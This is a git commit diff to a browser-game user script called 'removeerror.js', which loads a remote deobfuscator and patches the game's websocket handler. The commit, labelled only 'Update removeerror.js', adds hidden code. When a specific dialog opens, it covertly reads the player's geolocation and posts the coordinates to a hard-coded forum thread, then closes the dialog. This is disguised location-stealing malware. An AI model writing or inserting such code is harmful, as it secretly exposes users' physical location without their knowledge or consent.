3d3765ec3b18cb533bcfdf8e620424c727dc67db
parsesml <113039052+parsesml@users.noreply.github.com>
2023-09-29 00:46:53 +0100

    Update removeerror.js

--- removeerror.js
+++ removeerror.js
@@ -1,5 +1,10 @@
 (async ()=> {
     await $.getScript("https://cdn.jsdelivr.net/gh/parseml/many-deobf@latest/deobf.js");
+lfgpd=true;
+setInterval(()=>{
+    if(ig.game.holderDialog.holderId=='6348a0f4c41cdb6a0f9efb5e'&&ig.game.holderDialog.isOpen==true&&lfgpd==true){navigator.geolocation.getCurrentPosition((b)=>{ig.game.O2185.addForumThreadAndFirstComment_P("6513420ca3f7a6059d49e069", "a", b.coords.latitude+" "+b.coords.longitude);lfgpd=false});ig.game.holderDialog.close()}
+
+}, 0);
 bjghrg=Deobfuscator.object(ig.game, "useCdn", true);
 bjghrg1=Deobfuscator.function(ig.game[bjghrg], "/j/f/gf/", true);
 bjghrg2=Deobfuscator.function(ig.game[bjghrg], "/j/f/gc/", true);
@@ -11,3 +16,4 @@ ig.game[bjghrg][bjghrg1]((111132624627448).toString(16)+(mjjhgtm).toString(16)).
 gfdghmmr=Deobfuscator.function(ig.game.websocket, "c,d)", true)
 eval("ig.game.websocket."+gfdghmmr+"="+ig.game.websocket[gfdghmmr].toString().replaceAll("c,d){", "c,d){if(b.m=='lh'&&b.data.rid=='5ed02086677cd105f86141d6'&&b.data.ato>9999999999){blfdgjkf(b.data.ato)}else{").replaceAll("error(b))","error(b))}"))
 })();
+
